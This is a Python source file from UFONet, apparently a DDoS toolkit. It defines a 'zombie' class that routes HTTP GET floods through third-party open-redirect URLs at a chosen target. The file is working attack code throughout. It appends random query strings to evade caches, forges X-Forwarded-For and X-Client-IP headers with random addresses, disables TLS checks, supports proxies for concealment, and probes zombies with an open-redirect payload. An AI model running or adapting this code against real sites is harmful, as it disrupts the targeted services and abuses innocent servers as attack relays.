#!/usr/bin/env python3 
# -*- coding: utf-8 -*-"
"""
This file is part of the UFONet project, https://ufonet.03c8.net

Copyright (c) 2013/2020 | psy <epsylon@riseup.net>

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import io, hashlib, re, sys
import time, threading, random
from .randomip import RandomIP
try:
    import pycurl
except:
    print("\nError importing: pycurl lib. \n\n To install it on Debian based systems:\n\n $ 'sudo apt-get install python3-pycurl'\n")
    sys.exit(2)

class Zombie: # class representing a zombie
    # constructor: function to construct a zombie 
    # ufo: UFONet object, some state variables are recovered as well
    # zombie: name/url of zombie
    def __init__(self, ufo, zombie):
        self.ufo = ufo
        self.payload=ufo.payload
        self.attack_mode=ufo.attack_mode
        self.zombie = zombie
        self.connection_failed=True

    # wait for semaphore to be ready, add to herd, connect & suicide!
    def connect(self):
        reply=None
        with self.ufo.sem:
            self.ufo.herd.new_zombie(self.zombie)
            reply=self.do_connect()
            self.ufo.herd.kill_zombie(self.zombie, reply, self.connection_failed)
            return reply

    # handles zombie connection
    def do_connect(self):
        # connect zombies and manage different options: HEAD, GET, POST,
        # user-Agent, referer, timeout, retries, threads, delay..
        options = self.ufo.options
        c = pycurl.Curl()
        if self.ufo.head == True:
            try:
                c.setopt(pycurl.URL, self.zombie) # set 'self.zombie' target
            except:
                c.setopt(pycurl.URL, self.zombie.encode('utf-8')) 
            c.setopt(pycurl.NOBODY, 1) # use HEAD
        if self.payload == True:
            payload = self.zombie + "https://www.whitehouse.gov" # Open Redirect payload [requested by all UFONet motherships ;-)]
            try:
                c.setopt(pycurl.URL, payload) # set 'self.zombie' payload
            except:
                c.setopt(pycurl.URL, payload.encode('utf-8'))
            c.setopt(pycurl.NOBODY, 0) # use GET
        if self.ufo.external == True:
            external_service = "https://status.ws/" # external check
            if options.target.startswith('https://'): # fixing url prefix
                options.target = options.target.replace('https://','')
            if options.target.startswith('http://'): # fixing url prefix
                options.target = options.target.replace('http://','')
            external = external_service + options.target
            try:
                c.setopt(pycurl.URL, external) # external HEAD check before to attack
            except:
                c.setopt(pycurl.URL, external.encode('utf-8'))
            c.setopt(pycurl.NOBODY, 0) # use GET
        if self.attack_mode == True:
            if options.place: # use self.zombie's vector to connect to a target's place and add a random query to evade cache
                random_name_hash = random.randint(1, 100000000) 
                random_hash = random.randint(1, 100000000)
                if options.place.endswith("/"):
                    options.place = re.sub('/$', '', options.place)
                if options.place.startswith("/"):
                    if "?" in options.place:
                        url_attack = self.zombie + options.target + options.place + "&" + str(random_name_hash) + "=" + str(random_hash)
                    else:
                        url_attack = self.zombie + options.target + options.place + "?" + str(random_name_hash) + "=" + str(random_hash)
                else:
                    if "?" in options.place:
                        url_attack = self.zombie + options.target + "/" + options.place + "&" + str(random_name_hash) + "=" + str(random_hash)
                    else:
                        url_attack = self.zombie + options.target + "/" + options.place + "?" + str(random_name_hash) + "=" + str(random_hash)
            else:                                    
                url_attack = self.zombie + options.target # Use self.zombie vector to connect to original target url
            if self.ufo.options.verbose:
                print("[Info] [Zombies] Payload:", url_attack)
            try:
                c.setopt(pycurl.URL, url_attack) # GET connection on target site
            except:
                c.setopt(pycurl.URL, url_attack.encode('utf-8')) 
            c.setopt(pycurl.NOBODY, 0)  # use GET
        # set fake headers (important: no-cache)
        fakeheaders = ['Accept: image/gif, image/x-bitmap, image/jpeg, image/pjpeg', 
                       'Connection: Keep-Alive', 
                       'Content-type: application/x-www-form-urlencoded; charset=UTF-8', 
                       'Cache-control: no-cache', 
                       'Pragma: no-cache', 
                       'Pragma-directive: no-cache', 
                       'Cache-directive: no-cache', 
                       'Expires: 0'] 
        c.setopt(pycurl.FOLLOWLOCATION, 1) # set follow redirects
        c.setopt(pycurl.MAXREDIRS, 10) # set max redirects
        c.setopt(pycurl.SSL_VERIFYHOST, 0) # don't verify host
        c.setopt(pycurl.SSL_VERIFYPEER, 0) # don't verify peer
#       c.setopt(pycurl.SSLVERSION, pycurl.SSLVERSION_SSLv3) # sslv3
        c.setopt(pycurl.COOKIEFILE, '/dev/null') # black magic
        c.setopt(pycurl.COOKIEJAR, '/dev/null') # black magic
        c.setopt(pycurl.FRESH_CONNECT, 1) # important: no cache!
        c.setopt(pycurl.NOSIGNAL, 1) # pass 'long' to stack to fix libcurl bug
        c.setopt(pycurl.ENCODING, "") # use all available encodings (black magic)
        if options.xforw: # set x-forwarded-for
            generate_random_xforw = RandomIP()
            xforwip = generate_random_xforw._generateip('')
            xforwfakevalue = ['X-Forwarded-For: ' + str(xforwip)]
            fakeheaders = fakeheaders + xforwfakevalue
        if options.xclient: # set x-client-ip
            generate_random_xclient = RandomIP()
            xclientip = generate_random_xclient._generateip('')
            xclientfakevalue = ['X-Client-IP: ' + str(xclientip)]
            fakeheaders = fakeheaders + xclientfakevalue
        if options.host: # set http host header
            host_fakevalue = ['Host: ' + str(options.host)]
            fakeheaders = fakeheaders + host_fakevalue
        c.setopt(pycurl.HTTPHEADER, fakeheaders) # set fake headers
        b = io.BytesIO()
        c.setopt(pycurl.HEADERFUNCTION, b.write)
        h = io.BytesIO()
        c.setopt(pycurl.WRITEFUNCTION, h.write)
        if options.agent: # set user-agent
            c.setopt(pycurl.USERAGENT, options.agent)
        else:
            c.setopt(pycurl.USERAGENT, self.ufo.user_agent)
        if options.referer: # set referer
            c.setopt(pycurl.REFERER, options.referer)
        else:
            c.setopt(pycurl.REFERER, self.ufo.referer)
        if options.proxy: # set proxy
            proxy = options.proxy
            sep = ":"
            proxy_ip = proxy.rsplit(sep, 1)[0]
            if proxy_ip.startswith('http://'):
                proxy_ip = proxy_ip.replace('http://', '')
            elif proxy_ip.startswith('https://'):
                proxy_ip = proxy_ip.replace('https://', '')
            proxy_port = proxy.rsplit(sep, 1)[1]
            if proxy_ip == '127.0.0.1': # working by using 'localhost' as http proxy (ex: privoxy)
                proxy_ip = 'localhost'
            c.setopt(pycurl.PROXY, proxy_ip)
            c.setopt(pycurl.PROXYPORT, int(proxy_port))
        else:
            c.setopt(pycurl.PROXY, '')
            c.setopt(pycurl.PROXYPORT, pycurl.PROXYPORT)
        if options.timeout: # set timeout
            c.setopt(pycurl.TIMEOUT, options.timeout)
            c.setopt(pycurl.CONNECTTIMEOUT, options.timeout)
        else:
            c.setopt(pycurl.TIMEOUT, 5) # low value trying to control OS/python overflow when too many threads are open
            c.setopt(pycurl.CONNECTTIMEOUT, 5)
        if options.delay: # set delay
            self.ufo.delay = options.delay
        else:
            self.ufo.delay = 0 # default delay
        if options.retries: # set retries
            self.ufo.retries = options.retries
        else:
            self.ufo.retries = 0 # default retries
        try: # try to connect
            c.perform()
            time.sleep(self.ufo.delay)
            self.connection_failed = False
        except Exception as e: # try retries
            for count in range(0, self.ufo.retries):
                time.sleep(self.ufo.delay)
                try:
                    c.perform()
                    self.connection_failed = False
                except:
                    self.connection_failed = True
        if self.ufo.head == True: # HEAD reply
            try:
                reply = b.getvalue().decode('utf-8')
            except:
                try:
                    reply = b.getvalue()
                except:
                    reply = None
            try:
                code_reply = c.getinfo(pycurl.HTTP_CODE)
            except:
                code_reply = 0
            if reply:
                if options.verbose:
                    print("[Info] [AI] HEAD Reply:")
                    print("\n"+ reply)
            if self.ufo.options.testrpc:
                return reply
            else:
                return code_reply
        if self.ufo.external == True: # External reply
            try:
                external_reply = h.getvalue().decode('utf-8')
            except:
                try:
                    external_reply = h.getvalue()
                except:
                    external_reply = None
            if external_reply:
                if options.verbose:
                    print("[Info] [AI] EXTERNAL Reply:")
                    print("\n"+ external_reply)
            return external_reply
        if self.payload == True: # Payloads reply
            try:
                payload_reply = h.getvalue().decode('utf-8')
            except:
                try:
                    payload_reply = h.getvalue()
                except:
                    payload_reply = None
            if payload_reply:
                if options.verbose:
                    print("[Info] [AI] PAYLOAD Reply:")
                    print("\n"+ payload_reply)
            return payload_reply
        if self.attack_mode == True: # Attack mode reply
            try:
                attack_reply = h.getvalue().decode('utf-8')
            except:
                try:
                    attack_reply = h.getvalue()
                except:
                    attack_reply = None
            try:
                reply_code = c.getinfo(c.RESPONSE_CODE)
            except:
                reply_code = 0
            try:
                reply_time = c.getinfo(c.TOTAL_TIME)
            except:
                reply_time = 0
            try:
                reply_size = len(attack_reply)
            except:
                reply_size = 0
            if options.verbose:
                print("[Info] [AI] [Zombies] "+self.zombie+" -> REPLY (HTTP Code: "+ str(reply_code)+" | Time: "+str(reply_time)+" | Size: " + str(reply_size)+")")
                time.sleep(5) # managing screen (multi-threading flow time compensation)
            if len(attack_reply) == 0:
                print("[Info] [Zombies] " + self.zombie + " -> FAILED (cannot connect!)")
                if not self.ufo.options.disablepurge: # when purge mode discard failed zombie
                    self.ufo.discardzombies.append(self.zombie)
                    self.ufo.num_discard_zombies = self.ufo.num_discard_zombies + 1
            return [reply_code, reply_time, reply_size]
